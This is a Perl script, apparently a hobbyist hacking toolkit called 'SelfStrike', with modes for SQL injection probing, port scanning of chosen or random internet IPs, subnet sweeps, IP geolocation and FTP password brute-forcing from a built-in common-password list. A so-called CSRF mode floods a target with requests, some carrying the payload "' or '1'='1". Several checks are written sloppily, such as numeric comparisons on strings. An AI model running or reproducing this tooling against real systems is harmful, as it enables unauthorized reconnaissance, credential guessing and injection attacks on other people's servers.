#!/usr/bin/perl

use Getopt::Long;
use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;
use Net::FTP;
use Net::Ping;
#use Net::SSH::Perl;

my $modeuser="
\n\n\n
use:
SelfStrike.pl
 -t|type SqlScanner -u|url 'site' -p|port 80 -timeout 5 -re|request 'q=1&s=1' -m|method 'GET|POST'    *Scanner Sql Injection Vulnerability*
 
	--- -p|port '80' Default
	--- -timeout '5' Default
 \n
 -t|type PortScanner -i|ip 'ip' -p|port 80
 -t|type PortScanner -i|ip 'ip' -p|port 80 -timeout 5 -w|proto 'tcp'    *Scanner Port*
 -t|type PortScanner -i|ip 'ip|wordlist' -p|port '0|00|000' -timeout 5 -w|proto 'tcp'     *scans all standard doors*
 
	--- -p|port 00  *Scans All Standard Ports: 20,21,80,443...*
	--- -p|port 000 *Scans All Ports: 1-65500*
	--- -p|port 0000 *Port Random*
	--- -w|proto 'TCP' Default
	--- -p|port  '80'  Default
	--- -i|ip    '00' *Random IP*
 \n
 -t|type InfoIp -i|ip 'ip'  *Get Info IP*
 \n
 -t|type BruteForce-ftp -user 'admin' -pass 'wordlist.txt' -u 'site' *Brute Force in FTP*
	--- -pass 00 *password defaults 2012|2013*
	--- -pass 000 *password Random 12bits|16bits*
 \n
 -t|type BruteForce-ssh -user 'admin' -pass 'wordlist.txt' -u 'site' *Brute Force in SSH*
 \n
 -t|type SelfStrike-CSRF -re|request 'q=1&s=1' -m|method 'GET|POST' -n|number '25' *Cross Site Request Fogery*
	--- -qq 'name','pass' --qqr 'admin' '123'
 \n
 -t|type SelfStrike-Ip -i|ip '192.168.0.c' -p|port '80' -timeout 5 -s|save 'output.txt'  *Search IP*
	--- -ip 00 *random IPs*
 \n
 -t|type SelfStrike-Url -u|url 'deffy0h.tk' *Get Info WebSite*
 \n\n\n
";

my $developer="

\t\tDeveloper : Deffy0h/Skype:Deffy0h

";

my @port_	 =("20","21","22","80","23","25","53","443","465","1080","1194","1433","25565");
my @port_type=("FTP","FTP","SSH","HTTP","TELNET","SMTP","DOMAIN","HTTPS","SMTP","SOCKS","OPEN_VPN","SQL","MINECRAFT");

my @ftp 	=("admin","root","","anonymous","-anonymous@","administrator","123456","12345","12345678","qwerty","password","1234567890","1234","baseball","dragon","football","1234567","monkey","letmein","abc123","111111","mustang","access","shadow","master","michael","superman","696969","123123","batman","trustno1","iloveyou","adobe123","azerty","Admin","letmein","photoshop","shadow","sunshine","password1");

print <<EPeq;


		
.d88888b           dP .8888b .d88888b    dP            oo dP                
88.    "'          88 88   " 88.    "'   88               88                
`Y88888b. .d8888b. 88 88aaa  `Y88888b. d8888P 88d888b. dP 88  .dP  .d8888b. 
      `8b 88ooood8 88 88           `8b   88   88'  `88 88 88888"   88ooood8 
d8'   .8P 88.  ... 88 88     d8'   .8P   88   88       88 88  `8b. 88.  ... 
 Y88888P  `88888P' dP dP      Y88888P    dP   dP       dP dP   `YP `88888P' 
oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo

		 .___        ,__ ,__          ___/_     
		 /   `   ___ /  `/  `,    . .'  /\/     
		 |    |.'   `|__ |__ |    ` |  / ||,---.
		 |    ||----'|   |   |    | |,'  ||'   `
		 /---/ `.___,|   |    `---|./`---'/    |
					 /   /    \___/             
		
		
	-====================================================-
	-                 SelfStrike
	*-		Create By Deffy0h		    -0
	*-----------------------------------------------------
		
	\t\tSOMOS BRASILEIROS
	\tDEFFY0H Todos os direitos resevados
		
    $modeuser
	
	$developer
		
EPeq

my $url="";
my $ip="";
my $port="";
my $timeout="";
my $type="";
my $r="?";
my $method="GET";
my $REQ=$r."s='1&p='1&q='1";
my $OK_HTTP=200;
my $proto="";
my $user="";
my $pass="";
my $save="";
my $number=0;
my @pp="";
my @qqr="";


GetOptions(

	"u|url=s"=>\$url,
	"i|ip=s"=>\$ip,
	"t|type=s"=>\$type,
	"p|port=s"=>\$port,
	"timeout=i"=>\$timeout,
	"re|request=s"=>\$REQ,
	"m|method=s"=>\$method,
	"w|proto=s"=>\$proto,
	"user=s"=>\$user,
	"pass=s"=>\$pass,
	"s|save=s"=>\$save,
	"n|number=i"=>\$number,
	"qq=s@"=>\@qq,
	"qqr=s@"=>\@qqr

);

unless($type){
print $modeuser;
exit;
}

chomp $type;

if($type eq "SqlScanner" 		|| $type eq "sqlscanner"){
&SqlScanner
}
if($type eq "PortScanner" 		|| $type eq "portscanner"){
&PortScanner
}
if($type eq "InfoIp" 			|| $type eq "infoip"){
&info
}
if($type eq "BruteForce-ftp" 	|| $type eq "bruteforce-ftp"){
&BrutalForce_ftp
}
if($type eq "SelfStrike-Ip" 	|| $type eq "selfstrike-ip"){
&SelfStrike_Ip
}
if($type eq "selfstrike-Url" 	|| $type eq "selfstrike-url"){
&Selfstrike_Url
}
if($type eq "BruteForce-ssh"    || $type eq "bruteforce-ssh"){
&BruteForce_ssh
}
if($type eq "SelfStrike-CSRF"    || $type eq "selfstrike-csrf"){
&SelfStrike_CSRF
}

#4Er45
sub SelfStrike_CSRF(){

print "\n\n-=======================================================-\n";
print "\t\t\tSelfStrike-CSRF\n";
print "-=======================================================-\n\n";

unless($url){
print "\ntyping a DNS|URL -u 'site'\n";
print $modeuser;
exit;
}
unless($number){
$number=25;
}
unless($method){
$method="GET";
}


if($url!~m/http:/){
$url="http://$url";
}
if($REQ!~m/[?]/){
$REQ="?$REQ";
}
if($method eq "GET"){
#@2GET
my $c=0;
while($c<$number){
print "[+] connecting to GET:$url/$REQ:80 counter($c)\n";
$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(GET=>$url."/".$REQ)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
print "[+] SUCCESS\n\n";
}else{
print "[-] FAIL\n\n";
}
}
#
$c++;
}
}else{
#@2POST
my $c=0;
while($c<$number){
foreach my $req(@qq){
#print $req;
}
print "[+] connecting to POST:$url:80 counter($c)\n";
$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(POST=>$url,[password=>"' or '1'='1"])){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
print "[+] SUCCESS\n\n";
}else{
print "[-] FAIL\n\n";
}
}
#
$c++;
}
}
}

#445
sub BruteForce_ssh(){
print "\n\nnext version\n\n";
}

#@2abri
sub Selfstrike_Url(){
print "-=======================================================-\n";

unless($url){
print "[-] URL";
exit;
}

my $host = inet_ntoa(inet_aton($url));


unless($url){
print "\ntyping a DNS|URL -u 'site'\n";
print $modeuser;
exit;
}else{

print "[+] IP=> $host\n";
print "[+] PORT=> 80\n";

}

my $max_ping=15;
my $pings=1;
my $rq=0;

print "-=======================================================-\n\n";

while($pings<$max_ping){
$p=Net::Ping->new("tcp");
print "[+] send ping $pings to $host:80 \n";
if($p->ping($host)){
$rq++;
}
$pings++;
$p->close();#close;
}

print "[+] $rq|$pings response\n";

if($rq>=($pings-5)){
print "\n[+] FireWall=> false\n";
}else{
print "\n[+] FireWall=> true\n";
}

print "\n\n";

my $yurl="http://ip-api.com/json/".$host;

$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(GET=>$yurl)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
print "[+] HTTP:REQUEST, HTTP/1.1, STATUS CODE=".$response->status_line."\n";
print "[+] decode HTML\n\n";
$html=$response->decoded_content;
print "INFO IP:\n";
print $html."\n\n";
}
}

print "\n[+] HTML Resolver:\n";

if($url!~m/^http:/){
$url="http://".$url;
}

my $htmj="";
$uap = LWP::UserAgent->new;
if($rep=HTTP::Request->new(GET=>$url)){
$aqp=$uap->request($rep);
if($aqp->status_line==$OK_HTTP){
$htmj=$aqp->decoded_content;
}
}

if($htmj ne ""){
print "[+] FIND TAGS:\n\n\n";

print "-------------------------------------------------\n";
my($title)=$htmj=~m{<title>(.*?)</title>}si;
if($title ne ""){
print "(TITLE)=>\t $title \n";
}else{
print "(TITLE)=> no find";
}

print "\n";
print "-------------------------------------------------\n";

my @src=($htmj=~m/src="(.*?)"|src='(.*?)'/g);

print "(SRC)=>\n";

foreach my $ai(@src){
print "\t$ai\n";
}

print "-------------------------------------------------\n";

my @href=($htmj=~m/href="(.*?)"|href='(.*?)'/g);

print "(HREF)=>\n";

foreach my $ai(@href){
print "\t$ai\n";
}

print "-------------------------------------------------\n";

my @action=($htmj=~m/action="(.*?)"|action='(.*?)'/g);

print "(ACTION)=>\n";

foreach my $ai(@action){
print "\t$ai\n";
}

print "-------------------------------------------------\n";

my @OnClick=($htmj=~m/onClick='(.*?)'|onClick="(.*?)"/g);

print "(OnClick)=>\n";

foreach my $ai(@OnClick){
print "\t$ai\n";
}

print "-------------------------------------------------\n";

my @OnSubmit=($htmj=~m/onSubmit='(.*?)'|onSubmit="(.*?)"/g);

print "(OnSubmit)=>\n";

foreach my $ai(@OnSubmit){
print "\t$ai\n";
}


print "\n\n";
print "-========================================================-";
print "\t\nPort Scanner\n";
print "-========================================================-";
print "\n\n";


}else{
print "[-] erro resolver html\n";
}

my $i=0;
my $max=13;
while($i<$max){

	print "\n\n";
	print $host."\n";
	print "port: ".@port_[$i]." type: ".@port_type[$i]."\n";
	print "[+] connecting...\n";

if($s=IO::Socket::INET->new(

	PeerAddr => $host,
	PeerPort => @port_[$i],
	Proto    => "tcp",
	timeout  => 5

)){
	print "[+] open\n";
}else{
	print "[-] close\n";
}
$i++;
}

}


#@25d
#44$

sub SelfStrike_Ip(){

my $cap=0;

print "-=======================================================-\n";

unless($ip){
print "\n\n[-] typing a -i|ip 'IP'\n\n";
exit;
}else{
print "[+] IP => $ip\n";
}

unless($port){
$port=80;
print "[+] Port => 80\n";
}else{
print "[+] Port => $port\n";
}

unless($timeout){
$timeout=5;
print "[+] Timeout => 5\n";
}else{
print "[+] Timeout => $timeout\n";
}
unless($proto){
$proto="tcp";
print "[+] Proto => TCP\n";
}else{
print "[+] Proto => $proto\n";
}
unless($save){
print "[-] file not set";
exit;
}else{
print "[+] File => $save\n";
}

open($a,"+<",$save) 
or die("impossible to open file");


if($ip!~m/c/ && $ip ne "00"){
print "[-] $ip not allowed\n";
print "use: -i|ip 192.168.0.c or  -i|ip 00";
exit;
}

print "\n-=======================================================-\n";

print "\n\n";

if($ip=~m/c/){

while($cap<255){

my $time=localtime();
my $tmp_ip=$ip=~s/c/$cap/r;

print "[+] checking\t";
print "$tmp_ip:$port\n";

if($s=IO::Socket::INET->new(
	PeerAddr=>$tmp_ip,
	PeerPort=>$port,
	Proto=>	  $proto,
	timeout=> $timeout
)){
	
	my @lines=<$a>;

	$myText=@lines[scalar(@lines)]."\n\n -============================================================-\n DATE: $time \n OPEN: $tmp_ip:$port \n -============================================================-\n";
	
	print "[+] Open\n";
	print "[+] Save To File $save => \n\t $myText \n\n";
	
	$a->print($myText);
	$a->close();
	
}else{
	print "[-] Close\n";
}

print "\n";

#$12c
$cap++;

if($cap>255){
print "Quit SelfStrike-IP*";
exit;
}
}
}

if($ip eq "00"){
while(1){

my $time=localtime();
my $tmp_ip=int(rand(255)).".".int(rand(255)).".".int(rand(255)).".".int(rand(255));

print "[+] checking\t";
print "$tmp_ip:$port\n";

if($s=IO::Socket::INET->new(
	PeerAddr=>$tmp_ip,
	PeerPort=>$port,
	Proto=>	  $proto,
	timeout=> $timeout
)){
	
	my @lines=<$a>;

	$myText=@lines[scalar(@lines)]."\n\n -============================================================-\n DATE: $time \n OPEN: $tmp_ip:$port \n -============================================================-\n";
	
	print "[+] Open\n";
	print "[+] Save To File $save => \n\t $myText \n\n";
	
	$a->print($myText);
	$a->close();
	
}else{
	print "[-] Close\n";
}

print "\n";

}
}

}

#?d0
#-sx01

sub BrutalForce_ftp(){
print "-=======================================================-\n";

unless($url){
print "\ntyping a DNS|URL -u 'site'\n";
print $modeuser;
exit;
}

my $yurFTP="ftp://".$url;

print "[+] checking $url\n";

if($h=HTTP::Request->new(GET=>$url)){
print "[+] success\n";
}else{
print "[-] fail\n";
}
print "-=======================================================-\n";

print "\n[+] connecting to server FTP\n\n";


if($pass eq "00"){
print "\n\n\t\t*password defaults 2012|2013*\n\n";
print "-=======================================================-\n";
}

if($pass eq "000"){
print "\n\n\t\t*password Random 12bits|16bits*\n\n";
print "-=======================================================-\n\n";
}

my $c=0;

while(1){

$ftp = Net::FTP->new($url) 
or die("[-] erro connection to FTP\n");

my $opa="";

if($pass ne "00"){
open(a,"<",$pass) or die("[-] file '$pass' can't be opened\n");
my @pass=<a>;

chomp($opa=$pass[$c]);
if(scalar(@pass)<$c){
print "\n Quit Brute Force FTP* \n";
exit;
}
}

if($pass eq "00"){
$opa=@ftp[$c];
if((scalar(@ftp))<$c){
print "\n Quit Brute Force FTP* \n";
exit;
}
}

if($pass eq "000"){
my @abc=("a","b","c","d","e","f","g","h","i","j","l","m","n","o","p","q","r","s","t","u","v","y","x","z");
$opa=@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].@abc[(int(rand(23)))].(int(rand(99))).(int(rand(99))).(int(rand(99))).(int(rand(99)));
}

print "[+] LOGIN $yurFTP with USER=>$user AND PASSWORD=>$opa\n";

if($ftp->login($user,$opa)){
print "\n\n[+] SUCCESS\n";
print "-=====================================-\n";
print "URL=> $yurFTP\n";
print "USER=> $user\n";
print "PASSWORD=> $pass\n";
print "-=====================================-\n\n";
exit;
}else{
$ftp->close();
print "[-] FAIL\n"
}
$c++;
}

}

sub info(){
print "-=======================================================-\n";

unless($ip){
print "\n\n[-] typing a -i|ip 'IP'\n\n";
exit;
}else{
print "[+] IP => $ip\n";
}

my $yurl="http://ip-api.com/json/".$ip;

$ua = LWP::UserAgent->new;
if($re=HTTP::Request->new(GET=>$yurl)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
print "[+] HTTP:REQUEST, HTTP/1.1, STATUS CODE=".$response->status_line."\n";
print "[+] decode HTML\n";
$html=$response->decoded_content;
print "\n".$html."\n";
}	
	
print "\n-=======================================================-\n";
}
}

sub PortScanner(){

print "-=======================================================-\n";

unless($ip){
print "\n\n[-] typing a -i|ip 'IP'\n\n";
print $modeuser;
exit;
}else{
print "[+] IP => $ip\n";
}
unless($port){
$port=80;
print "[+] Port => 80\n";
}else{
print "[+] Port => $port\n";
}
unless($timeout){
$timeout=5;
print "[+] Timeout => 5\n";
}else{
print "[+] Timeout => $timeout\n";
}
unless($proto){
$proto="tcp";
print "[+] Proto => TCP\n";
}else{
print "[+] Proto => $proto\n";
}

chomp($proto);
if($proto ne "tcp" && $proto ne "udp"){
print "[-] Proto Is Not Valid (TCP|UDP)";
exit;
}

print "-=======================================================-\n";

chomp($port);
if($port ne "00" && $port ne "000" && $port ne "0000"){

if($ip eq "00"){
	my $ip1=int(rand(255));
	my $ip2=int(rand(255));
	my $ip3=int(rand(255));
	my $ip4=int(rand(255));

	$ip=$ip1.".".$ip2.".".$ip3.".".$ip4;

}

print "[+] Checking $ip:$port - $proto\n";

if($s=IO::Socket::INET->new(
	PeerAddr=>$ip,
	PeerPort=>$port,
	Proto=>	  $proto,
	timeout=> $timeout
)){
	print "[+] Open\n";
}else{
	print "[-] Close\n";
}
}

if($port eq "00"){

print "\n\n\t*Scans All Standard Ports: 20,21,80,443...*\n\n";
print "-=======================================================-\n";

my $i=0;
my $max=13;
while($i<$max){


if($ip eq "00"){
	my $ip1=int(rand(255));
	my $ip2=int(rand(255));
	my $ip3=int(rand(255));
	my $ip4=int(rand(255));

	$ip=$ip1.".".$ip2.".".$ip3.".".$ip4;

}

	print "\n\n";
	print $ip."\n";
	print "port: ".@port_[$i]." type: ".@port_type[$i]."\n";
	print "[+] connecting...\n";

if($s=IO::Socket::INET->new(

	PeerAddr => $ip,
	PeerPort => @port_[$i],
	Proto    => $proto,
	timeout  => $timeout

)){
	print "[+] open\n";
}else{
	print "[-] close\n";
}
$i++;
}
}

if($port eq "000"){

print "\n\n\t*Scans All Ports: 1-65500*\n\n";
print "-=======================================================-\n";

my $c_port=1;
my $max_port=65500;

print "\n\n";

if($ip eq "00"){
	my $ip1=int(rand(255));
	my $ip2=int(rand(255));
	my $ip3=int(rand(255));
	my $ip4=int(rand(255));

	$ip=$ip1.".".$ip2.".".$ip3.".".$ip4;

}

while($c_port<$max_port){

print "$ip:$c_port\n";
print "[+] connecting...\n";

if($s=IO::Socket::INET->new(
	
	PeerAddr => $ip,
	PeerPort => $c_port,
	Proto    => $proto,
	timeout  => $timeout

)){
	print "[+] open\n";
}else{
	print "[-] close\n";
}

print "\n";
$c_port++;
}
}

}

sub SqlScanner(){
unless($url){
print "\ntyping a DNS|URL -u 'site'\n";
print $modeuser;
exit;
}

if($url!~m/http:/){
$url="http://$url";
}


$port=80;
$timeout=5;

my ($html,$qInjection);
$qInjection="You have an error in your SQL syntax";

print "\n[+] checking url...\n";

if($s=IO::Socket::INET->new(
	PeerAddr=>$url,
	PeerPort=>$port,
	Proto=>	  "tcp",
	timeout=> $timeout
)){
print "[+] OK\n";
}else{
print "[-] not allowed send Socket to $url:$port \n";
}


print "[+] connecting with $url:$port\n";

$ua = LWP::UserAgent->new;

if($REQ!~m/[?]/){
$REQ="?$REQ";
}

my $temp_url="http://www.".$url.":$port/".$REQ;

if($method=="GET" || $method=="get"){
print "[+] HTTP:REQUEST, GET $temp_url ProtocolVersion:HTTP/1.1\n";

if($port==80 || $port==8080){
if($re=HTTP::Request->new(GET=>$temp_url)){
$response=$ua->request($re);
if($response->status_line==$OK_HTTP){
print "[+] HTTP:REQUEST, HTTP/1.1, STATUS CODE=".$response->status_line."\n";
print "[+] decode HTML\n";
$html=$response->decoded_content;
chomp $html;
if($html=~$qInjection){
print "\n\n [+] $temp_url <*p>SQL INJECTION<*p> Vulnerability* \n\n";
}else{
print "\n[+] was not found <*p>SQL INJECTION<*p> to $temp_url";
exit;
}
}else{
print "[-] ERRO: ".$response->status_line;
exit;
}
}else{
print "[-] erro conection";
exit;
}
}else{
print "[-] not allowed connection HTTPS:443";
exit;
}

}else{
print "[-]"; exit;
}
}


__END__

Deffy0h   Channel Youtube
https://www.youtube.com/channel/UC9kMfNPD3dgMO94JeFdTVBA
http://deffy0h.tk

@T1baah


Banner:
http://www.kammerl.de/ascii/AsciiSignature.php

GeoLocalization:
http://ip-api.com/json/





























































































